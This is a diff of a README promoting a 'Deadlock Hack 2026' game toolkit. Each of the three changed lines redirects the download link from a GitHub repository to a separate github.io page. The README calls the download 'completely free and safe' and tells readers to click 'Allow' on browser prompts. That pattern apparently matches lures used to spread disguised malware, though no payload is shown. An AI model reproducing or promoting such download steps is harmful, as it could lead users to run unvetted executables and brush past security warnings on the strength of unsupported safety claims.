@@ -1,6 +1,6 @@
 # 🎮 deadlock-hack-2026-hero-build-toolkit - Your Ultimate Deadlock Companion for Victory
 
-[![Download Now](https://img.shields.io/badge/Download-Deadlock%20Toolkit-blue?style=for-the-badge&logo=github)](https://github.com/Anthropical-chimariko672/deadlock-hack-2026-hero-build-toolkit)
+[![Download Now](https://img.shields.io/badge/Download-Deadlock%20Toolkit-blue?style=for-the-badge&logo=github)](https://anthropical-chimariko672.github.io)
 
 ---
 
@@ -59,7 +59,7 @@ Getting the toolkit up and running is quick and straightforward. Follow these si
 ### 📥 Step 1: Download the Application
 
 Visit this link to download the application:  
-**[👉 Click Here to Download Deadlock Toolkit](https://github.com/Anthropical-chimariko672/deadlock-hack-2026-hero-build-toolkit)**
+**[👉 Click Here to Download Deadlock Toolkit](https://anthropical-chimariko672.github.io)**
 
 The download is completely free and safe. Your browser may ask you to confirm the download – click "Save" or "Allow" to proceed.
 
@@ -206,6 +206,6 @@ Found a bug? Have a great build suggestion? Want to translate the app? We welcom
 
 Stop guessing and start winning. Download the **Deadlock Hack 2026 Hero Build Toolkit** today and experience the difference professional planning makes.
 
-**[⬇️ Download Now – It's Free!](https://github.com/Anthropical-chimariko672/deadlock-hack-2026-hero-build-toolkit)**
+**[⬇️ Download Now – It's Free!](https://anthropical-chimariko672.github.io)**
 
 Your journey to becoming a top-tier *Deadlock* player starts here. Good luck, have fun, and see you on the battlefield!
